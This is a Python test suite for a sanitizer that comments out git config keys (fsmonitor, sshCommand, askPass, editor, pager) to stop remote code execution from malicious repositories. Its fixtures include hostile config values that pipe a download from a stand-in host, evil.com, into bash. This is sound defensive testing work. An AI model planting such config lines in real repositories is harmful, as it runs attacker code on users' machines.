#!/usr/bin/env python3
"""Tests for git config sanitization to prevent RCE attacks."""

import os
import re
import sys
import tempfile
import unittest


def printf(fmt, *args, file=sys.stdout):
    if args:
        fmt = fmt % args
    file.write(fmt)
    file.flush()


def sanitize_file(filepath):
    """ Inplace comment out possibly unsafe lines based on regex """
    assert os.path.isfile(filepath), "%s is not a file" % filepath

    UNSAFE=r"^(\s*)(fsmonitor|sshCommand|askPass|editor|pager)(\s*=)"

    with open(filepath, 'r+') as f:
        content = f.read()
        modified_content = re.sub(UNSAFE, r'\1# \2\3', content, flags=re.IGNORECASE|re.MULTILINE)
        if content != modified_content:
            printf("Warning: '%s' file was altered\n" % filepath)
            f.seek(0)
            f.write(modified_content)
            f.truncate()


class TestSanitizeFile(unittest.TestCase):
    """Test suite for sanitize_file function."""

    def setUp(self):
        """Create a temporary file for each test."""
        self.temp_fd, self.temp_path = tempfile.mkstemp(text=True)
        os.close(self.temp_fd)

    def tearDown(self):
        """Clean up temporary file."""
        if os.path.exists(self.temp_path):
            os.unlink(self.temp_path)

    def test_sanitize_fsmonitor_rce(self):
        """Test that fsmonitor RCE vector is properly sanitized."""
        malicious_config = """[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
        fsmonitor = "bash -c 'curl -s https://evil.com/payload.sh | bash'"
[user]
        email = test@example.com
"""
        with open(self.temp_path, 'w') as f:
            f.write(malicious_config)

        sanitize_file(self.temp_path)

        with open(self.temp_path, 'r') as f:
            result = f.read()

        self.assertIn('# fsmonitor =', result)
        self.assertNotIn('\n        fsmonitor =', result)

    def test_sanitize_sshcommand_rce(self):
        """Test that sshCommand RCE vector is properly sanitized."""
        malicious_config = """[core]
        sshCommand = "bash -c 'malicious command'"
"""
        with open(self.temp_path, 'w') as f:
            f.write(malicious_config)

        sanitize_file(self.temp_path)

        with open(self.temp_path, 'r') as f:
            result = f.read()

        self.assertIn('# sshCommand =', result)

    def test_sanitize_askpass_rce(self):
        """Test that askPass RCE vector is properly sanitized."""
        malicious_config = """[core]
        askPass = "/tmp/malicious_script.sh"
"""
        with open(self.temp_path, 'w') as f:
            f.write(malicious_config)

        sanitize_file(self.temp_path)

        with open(self.temp_path, 'r') as f:
            result = f.read()

        self.assertIn('# askPass =', result)

    def test_sanitize_editor_rce(self):
        """Test that editor RCE vector is properly sanitized."""
        malicious_config = """[core]
        editor = "vim -c '!bash -c \"curl evil.com | bash\"'"
"""
        with open(self.temp_path, 'w') as f:
            f.write(malicious_config)

        sanitize_file(self.temp_path)

        with open(self.temp_path, 'r') as f:
            result = f.read()

        self.assertIn('# editor =', result)

    def test_sanitize_pager_rce(self):
        """Test that pager RCE vector is properly sanitized."""
        malicious_config = """[core]
        pager = "less -+F; curl evil.com | bash"
"""
        with open(self.temp_path, 'w') as f:
            f.write(malicious_config)

        sanitize_file(self.temp_path)

        with open(self.temp_path, 'r') as f:
            result = f.read()

        self.assertIn('# pager =', result)

    def test_safe_config_unchanged(self):
        """Test that safe configuration is not modified."""
        safe_config = """[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[user]
        name = John Doe
        email = john@example.com
[remote "origin"]
        url = https://github.com/user/repo.git
        fetch = +refs/heads/*:refs/remotes/origin/*
"""
        with open(self.temp_path, 'w') as f:
            f.write(safe_config)

        sanitize_file(self.temp_path)

        with open(self.temp_path, 'r') as f:
            result = f.read()

        self.assertEqual(safe_config, result)

    def test_already_commented_lines_unchanged(self):
        """Test that already commented dangerous lines are not double-commented."""
        commented_config = """[core]
        # fsmonitor = "dangerous command"
        filemode = true
"""
        with open(self.temp_path, 'w') as f:
            f.write(commented_config)

        sanitize_file(self.temp_path)

        with open(self.temp_path, 'r') as f:
            result = f.read()

        # Should not become ## fsmonitor
        self.assertNotIn('## fsmonitor', result)
        self.assertIn('# fsmonitor', result)

    def test_mixed_safe_and_unsafe_config(self):
        """Test config with both safe and unsafe settings."""
        mixed_config = """[core]
        repositoryformatversion = 0
        filemode = true
        fsmonitor = "xcalc"
        bare = false
        sshCommand = "ssh -i /tmp/key"
[user]
        name = Test User
        email = test@example.com
"""
        with open(self.temp_path, 'w') as f:
            f.write(mixed_config)

        sanitize_file(self.temp_path)

        with open(self.temp_path, 'r') as f:
            result = f.read()

        # Unsafe should be commented
        self.assertIn('# fsmonitor =', result)
        self.assertIn('# sshCommand =', result)

        # Safe should remain unchanged
        self.assertIn('repositoryformatversion = 0', result)
        self.assertIn('name = Test User', result)

    def test_indented_dangerous_config(self):
        """Test that indented dangerous config variables are sanitized."""
        indented_config = """[core]
	fsmonitor = "bash -c 'xcalc &'"
    sshCommand = "evil"
        askPass = "/tmp/bad"
"""
        with open(self.temp_path, 'w') as f:
            f.write(indented_config)

        sanitize_file(self.temp_path)

        with open(self.temp_path, 'r') as f:
            result = f.read()

        # All should be commented regardless of indentation
        self.assertIn('# fsmonitor =', result)
        self.assertIn('# sshCommand =', result)
        self.assertIn('# askPass =', result)


if __name__ == '__main__':
    unittest.main()
